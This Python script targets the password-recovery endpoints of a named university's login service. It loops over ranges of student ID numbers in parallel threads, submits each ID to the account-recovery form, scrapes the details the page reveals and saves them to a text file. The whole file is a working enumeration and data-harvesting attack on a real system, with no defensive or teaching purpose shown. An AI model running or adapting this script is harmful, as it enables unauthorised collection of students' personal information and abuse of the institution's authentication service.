import requests,lxml,re,random
import threading, time
from bs4 import BeautifulSoup

def get_user(user_id):
    user_id = str(user_id)
    url1 = "https://ssl.jxufe.edu.cn/uid/forget!forget2Type"

    bd_session = requests.Session()

    response = bd_session.get(url1)


    url2 = "https://ssl.jxufe.edu.cn/uid/forget_json!forgetExistAccount"
    data2 = {
        'needAlert': 'false',
        'needRedirect': 'true',
        'accountkey': f'{user_id}',
    }

    bd_session.post(url2, data=data2)
    res = bd_session.get("https://ssl.jxufe.edu.cn/uid/forget!forget2Type").text
    soup = BeautifulSoup(res, "lxml")
    s_path = "div.input-div"
    user_data = str(soup.select(s_path)).replace("\xa0","").replace('\n','').replace('\r','').replace('\t','')
    so = "".join(i for i in list(user_data) if i not in ['', ' ', '"'])
    # print(so)
    my_data = re.findall('(?<=</span>).*?(?=</div>)', so)
    data_list = [i for i in my_data if len(i) < 12]
    all_list = [user_id, *data_list]
    if all_list:
        print(all_list)
    return all_list


# for user_id in range(2201704176,2201704186):
#     a = get_user(str(user_id))
#     print(a)
# get_user(2201704176)



a = []
#

def test1():
    for i in range(2201705348,2201705448):
        # id0 = random.randint(2201700000,2201799999)
        res = get_user(i)
        if res != []:
            with open("t1.txt",'a') as f:
                f.write(str(res)+'\n')
            a.append(i)


def test2():
    for i in range(2201705248,2201705348):
        # id0 = random.randint(2201700000,2201799999)
        res = get_user(i)
        if res != []:
            with open("t1.txt", 'a') as f:
                f.write(str(res) + '\n')
            a.append(i)

def test3():
    for i in range(2201790001,2201790009):
        # id0 = random.randint(2201700000,2201799999)
        res = get_user(i)
        if res != []:
            with open("t1.txt", 'a') as f:
                f.write(str(res) + '\n')
            a.append(i)


def test4():
    for i in range(2201780001,2201780009):
        # id0 = random.randint(2201700000,2201799999)
        res = get_user(i)
        if res != []:
            with open("t1.txt", 'a') as f:
                f.write(str(res) + '\n')
            a.append(i)

def test5():
    for i in range(2201770001,2201770009):
        # id0 = random.randint(2201700000,2201799999)
        res = get_user(i)
        if res != []:
            with open("t1.txt", 'a') as f:
                f.write(str(res) + '\n')
            a.append(i)

def test6():
    for i in range(2201760001,2201760009):
        # id0 = random.randint(2201700000,2201799999)
        res = get_user(i)
        if res != []:
            with open("t1.txt", 'a') as f:
                f.write(str(res) + '\n')
            a.append(i)

def test6():
    for i in range(2201750001,2201750009):
        # id0 = random.randint(2201700000,2201799999)
        res = get_user(i)
        if res != []:
            with open("t1.txt", 'a') as f:
                f.write(str(res) + '\n')
            a.append(i)
def test7():
    for i in range(2201740001,2201740009):
        # id0 = random.randint(2201700000,2201799999)
        res = get_user(i)
        if res != []:
            with open("t1.txt", 'a') as f:
                f.write(str(res) + '\n')
            a.append(i)
def last():
    t1 = threading.Thread(target=test1)
    t2 = threading.Thread(target=test2)
    t3 = threading.Thread(target=test3)
    t4 = threading.Thread(target=test4)
    t5 = threading.Thread(target=test5)
    t6 = threading.Thread(target=test6)
    t7 = threading.Thread(target=test7)

    # t1.start()
    # t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()
    t7.start()

try:
    last()
except Exception as e:
    print(e)
print(a)